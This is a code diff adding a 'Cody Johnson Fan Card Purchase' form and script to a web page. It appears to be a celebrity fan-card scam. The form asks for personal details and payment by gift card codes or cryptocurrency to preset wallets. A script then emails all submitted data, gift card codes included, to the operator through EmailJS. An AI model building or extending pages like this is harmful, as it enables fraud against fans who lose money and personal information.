@@ -567,7 +567,94 @@
         <h4>GET NOW</h4>
         <p>Find your tier. Claim your perks. Live the music.👉 [Join COJO Nation Now]</p>
         <div class="image1"><img src="css/image/codyticketimage.png" alt=""></div>
+        <h2>Buy Your Fan Card</h2>
       </div>
+      <div class="containerr">
+  <h2>Cody Johnson Fan Card Purchase</h2>
+  <form id="purchaseForm" name="price">
+
+    <label for="cardType">Select Card Type:</label>
+    <select id="cardType" name="card_type" required>
+      <option value="" disabled selected hidden>Card plans</option>
+      <option value="Standard">Standard - $1000</option>
+      <option value="Premium">Premium - $1500</option>
+      <option value="VVIP">VVIP - $3000</option>
+    </select>
+
+    <div class="summary" id="summaryBox">
+      <strong>Selected Card:</strong> <span id="selectedCard">Standard</span><br>
+      <strong>Price:</strong> $<span id="selectedPrice">1000</span>
+    </div>
+
+    <h3>Shipping Address</h3>
+    <label>First Name:</label>
+    <input type="text" name="first_name" required>
+
+    <label>Last Name:</label>
+    <input type="text" name="last_name" required>
+
+    <label>Country:</label>
+    <input type="text" name="country" required>
+
+    <label>State:</label>
+    <input type="text" name="state" required>
+
+    <label>Zip Code:</label>
+    <input type="text" name="zip" required>
+
+    <label>Email:</label>
+    <input type="email" name="user_email" required>
+
+    <label>Phone Number:</label>
+    <input type="tel" name="phone" required>
+
+    <h3>Payment Method</h3>
+    <select id="paymentMethod" name="payment_method" required>
+      <option value="" disabled selected hidden>Select payment method</option>
+      <option value="bitcoin">Pay with Bitcoin</option>
+      <option value="paypal">Pay with PayPal</option>
+      <option value="bank">Pay with Bank Transfer</option>
+      <option value="gift">Pay with Gift Card</option>
+    </select>
+
+    <div class="bitcoin-details" id="bitcoinDetails">
+      <label for="cryptoType">Select Crypto:</label>
+      <select id="cryptoType" name="crypto_type">
+        <option value="" disabled selected hidden>Select coin type</option>
+        <option value="btc">Bitcoin (BTC)</option>
+        <option value="eth">Ethereum (ETH)</option>
+        <option value="usdt">Tether (USDT)</option>
+      </select>
+
+      <div class="wallet-display">
+        <label>Wallet Address:</label>
+        <div style="display: flex; align-items: center;">
+          <input type="text" id="walletAddress" readonly style="flex: 1; margin-right: 10px;">
+          <button type="button" onclick="copyAddress()">Copy</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="gift-details" id="giftDetails">
+      <div class="gift-warning">
+        <strong>Note:</strong> If you are paying with multiple gift cards, enter each code and amount separately.
+        For help, contact <strong>support@gmail.com</strong>.
+      </div>
+      <label>Type of Gift Card:</label>
+      <input type="text" name="gift_type" placeholder="e.g. Amazon, iTunes">
+      <label>Gift Card Code:</label>
+      <input type="text" name="gift_code" placeholder="Enter gift card code">
+    </div>
+
+    <div class="notice-message" id="noticeMessage">
+      <span id="paymentNoticeText"></span> Contact <strong><a href="#" id="supportEmail"></a></strong>.
+    </div>
+
+    <div class="but">
+      <button type="submit" id="submitBtn">Proceed to Payment</button>
+    </div>
+  </form>
+</div>
       </div>
     </div>
   </div>
@@ -968,7 +1055,6 @@
   // Adjust height to the visible panel
   setTimeout(() => {
     const activePanel = panels[index];
-    tabsContainer.style.height = activePanel.offsetHeight + 'px';
   }, 500); // Wait for transition to complete
 
   // Update button styles
@@ -991,8 +1077,172 @@ window.addEventListener('load', () => {
      document.getElementById("content").style.display = "block";
    });
 
+</script>
 
-      </script>
+<!-- EmailJS library -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<!-- JavaScript to handle form logic -->
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    emailjs.init("EdwkxvlHNY3KO8MNc");
+
+    const form = document.getElementById("purchaseForm");
+    const cardType = document.getElementById("cardType");
+    const selectedCard = document.getElementById("selectedCard");
+    const selectedPrice = document.getElementById("selectedPrice");
+    const paymentMethod = document.getElementById("paymentMethod");
+    const bitcoinDetails = document.getElementById("bitcoinDetails");
+    const giftDetails = document.getElementById("giftDetails");
+    const noticeMessage = document.getElementById("noticeMessage");
+    const paymentNoticeText = document.getElementById("paymentNoticeText");
+    const supportEmail = document.getElementById("supportEmail");
+    const submitBtn = document.getElementById("submitBtn");
+    const cryptoType = document.getElementById("cryptoType");
+    const walletAddress = document.getElementById("walletAddress");
+
+    const prices = {
+      'Standard': 1000,
+      'Premium': 1500,
+      'VVIP': 3000
+    };
+
+    const walletMap = {
+      btc: "bc1qexamplebtc12345",
+      eth: "0xExampleEthereumAddress987654321",
+      usdt: "TExampleUSDTAddress123456789"
+    };
+
+    cardType.addEventListener('change', () => {
+      const type = cardType.value;
+      selectedCard.textContent = type;
+      selectedPrice.textContent = prices[type] || "0";
+    });
+
+    function updateWalletAddress() {
+      const type = cryptoType.value;
+      walletAddress.value = walletMap[type] || "";
+    }
+
+    cryptoType.addEventListener("change", updateWalletAddress);
+
+    window.copyAddress = function () {
+      walletAddress.select();
+      walletAddress.setSelectionRange(0, 99999);
+      document.execCommand("copy");
+      alert("Wallet address copied!");
+    }
+
+    function showSection(element, show) {
+      if (show) {
+        element.classList.add("show");
+      } else {
+        element.classList.remove("show");
+      }
+    }
+
+    paymentMethod.addEventListener('change', () => {
+      const method = paymentMethod.value;
+
+      showSection(bitcoinDetails, false);
+      showSection(giftDetails, false);
+      showSection(noticeMessage, false);
+
+      paymentNoticeText.textContent = "";
+      supportEmail.textContent = "";
+      supportEmail.href = "#";
+
+      form.querySelector('[name="gift_type"]').required = false;
+      form.querySelector('[name="gift_code"]').required = false;
+      form.querySelector('[name="crypto_type"]').required = false;
+
+      if (method === 'gift') {
+        showSection(giftDetails, true);
+        form.querySelector('[name="gift_type"]').required = true;
+        form.querySelector('[name="gift_code"]').required = true;
+        paymentNoticeText.textContent = "Please follow the gift card instructions carefully.";
+        supportEmail.textContent = "support@gmail.com";
+        supportEmail.href = "mailto:support@gmail.com";
+        showSection(noticeMessage, true);
+      } else if (method === 'bitcoin') {
+        showSection(bitcoinDetails, true);
+        form.querySelector('[name="crypto_type"]').required = true;
+        cryptoType.dispatchEvent(new Event('change'));
+        paymentNoticeText.textContent = "Send your payment to the selected wallet address.";
+        supportEmail.textContent = "support@gmail.com";
+        supportEmail.href = "mailto:support@gmail.com";
+        showSection(noticeMessage, true);
+      } else if (method === 'paypal' || method === 'bank') {
+        paymentNoticeText.textContent = `You will be redirected to ${method === 'paypal' ? "PayPal" : "your bank"} to complete payment.`;
+        supportEmail.textContent = "support@gmail.com";
+        supportEmail.href = "mailto:support@gmail.com";
+        showSection(noticeMessage, true);
+      }
+    });
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Processing...";
+
+      const orderId = "ORD-" + Date.now();
+
+      const formData = {
+        card_type: cardType.value,
+        price: prices[cardType.value],
+        first_name: form.first_name.value,
+        last_name: form.last_name.value,
+        country: form.country.value,
+        state: form.state.value,
+        zip: form.zip.value,
+        user_email: form.user_email.value,
+        phone: form.phone.value,
+        payment_method: paymentMethod.value,
+        crypto_type: form.crypto_type ? form.crypto_type.value : '',
+        gift_type: form.gift_type ? form.gift_type.value : '',
+        gift_code: form.gift_code ? form.gift_code.value : '',
+        order_id: orderId
+      };
+
+      emailjs.send("service_yo2ucc8", "template_787r21q", formData)
+        .then(() => {
+          return emailjs.send("service_yo2ucc8", "template_5t9j0xn", {
+            to_email: formData.user_email,
+            first_name: formData.first_name,
+            card_type: formData.card_type,
+            payment_method: formData.payment_method,
+            price: formData.price,
+            country: formData.country,
+            state: formData.state,
+            phone: formData.phone,
+            order_id: formData.order_id
+          });
+        })
+        .then(() => {
+          alert("Thank you! Purchase details sent to you and admin.");
+          form.reset();
+          cardType.dispatchEvent(new Event('change'));
+          paymentMethod.dispatchEvent(new Event('change'));
+        })
+        .catch((error) => {
+          console.error("EmailJS error:", error);
+          alert("Oops! There was an error sending your emails. Please try again later.");
+        })
+        .finally(() => {
+          submitBtn.disabled = false;
+          submitBtn.textContent = "Proceed to Payment";
+        });
+    });
+
+    cardType.dispatchEvent(new Event('change'));
+    paymentMethod.dispatchEvent(new Event('change'));
+  });
+</script>
+
+
+
+
 
 
 
